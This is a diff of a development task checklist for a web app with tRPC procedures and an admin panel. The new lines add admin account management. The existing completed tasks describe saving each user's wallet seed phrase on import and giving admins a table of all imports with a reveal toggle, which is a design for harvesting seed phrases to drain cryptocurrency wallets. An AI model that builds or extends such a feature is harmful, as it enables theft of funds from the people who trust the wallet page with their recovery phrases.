@@ -97,3 +97,11 @@
 - [x] Add tRPC procedure: saveSeedPhrase (saves on import, linked to user session or guest)
 - [x] Wire Wallet page IMPORT WALLET button to call the tRPC procedure
 - [x] Add Wallet Imports section in Admin panel: table of all imports with user, masked seed phrase, reveal toggle, date
+
+## Admin Account Management
+- [x] Add adminCredentials table (id, userId, username, passwordHash, createdBy, createdAt)
+- [x] Push DB migration
+- [x] Add tRPC procedure: createAdmin (admin only — creates a new user with role=admin + stores credentials)
+- [x] Add tRPC procedure: listAdmins (admin only — list all admin accounts)
+- [x] Add tRPC procedure: toggleActive (admin only — enable/disable admin account)
+- [x] Add Admin Accounts section in Admin panel: list all admins, create new admin modal (name, email, username, password), enable/disable access
